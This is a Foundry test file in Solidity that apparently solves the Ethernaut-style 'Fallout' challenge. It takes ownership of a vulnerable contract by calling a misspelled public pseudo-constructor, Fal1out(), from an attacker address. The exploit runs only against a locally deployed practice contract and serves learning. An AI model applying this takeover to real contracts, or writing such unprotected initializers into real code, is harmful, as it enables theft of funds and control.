// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// Interface to talk to the Fallout contract (which is on 0.6.0).
// We don't import the .sol directly to avoid the version clash.
interface IFallout {
    function Fal1out() external payable;
    function owner() external view returns (address);
}

contract FalloutExploit is Test {
    IFallout public target;
    address attacker = address(0xBAD);

    function setUp() public {
        // Foundry compiles src/Fallout.sol with its own 0.6.0 compiler
        // and we instantiate it here via its artifact.
        target = IFallout(deployCode("Fallout.sol:Fallout"));
    }

    function test_TakeOwnership() public {
        assertTrue(target.owner() != attacker, "attacker should not be owner yet");

        // EXPLOIT: call the fake constructor Fal1out() -- it's public
        vm.prank(attacker);
        target.Fal1out();

        assertEq(target.owner(), attacker, "attacker should be owner");
        console.log("Exploit successful: ownership taken with a single call");
    }
}
